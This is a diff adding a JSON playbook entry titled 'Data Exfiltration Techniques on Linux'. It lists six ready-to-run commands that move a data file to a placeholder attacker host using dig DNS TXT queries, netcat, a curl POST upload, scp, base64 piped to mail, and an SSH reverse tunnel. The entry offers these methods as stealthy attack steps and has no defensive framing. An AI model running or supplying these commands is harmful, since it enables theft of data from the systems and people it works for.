@@ -1,0 +1,43 @@
+{
+	"name": "Data Exfiltration Techniques on Linux",
+	"description": "Stealthy and direct methods to move data off Linux systems using native tools.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "DNS Exfiltration via dig",
+			"command": "while read line; do dig +short $line.attacker.com TXT; done < data.txt",
+			"description": "Send data chunked in DNS TXT queries."
+		},
+		{
+			"index": 2,
+			"name": "Netcat File Transfer",
+			"command": "nc -w 3 attacker.com 4444 < data.tar.gz",
+			"description": "Direct TCP stream to listener (if outbound allowed)."
+		},
+		{
+			"index": 3,
+			"name": "cURL HTTP POST",
+			"command": "curl -X POST -F 'file=@data.txt' http://attacker.com/upload",
+			"description": "Upload via HTTP multipart form."
+		},
+		{
+			"index": 4,
+			"name": "SCP Secure Copy",
+			"command": "scp data.txt user@attacker.com:~/loot/",
+			"description": "Encrypted transfer over SSH (port 22)."
+		},
+		{
+			"index": 5,
+			"name": "Base64 + Email (sendmail)",
+			"command": "base64 data.txt | mail -s 'report' attacker@email.com",
+			"description": "Encode and send via local MTA."
+		},
+		{
+			"index": 6,
+			"name": "SSH Reverse Tunnel Exfil",
+			"command": "ssh -R 8888:localhost:22 user@attacker.com 'cat > tunnel.txt' < data.txt",
+			"description": "Push data through reverse SSH tunnel."
+		}
+	]
+}
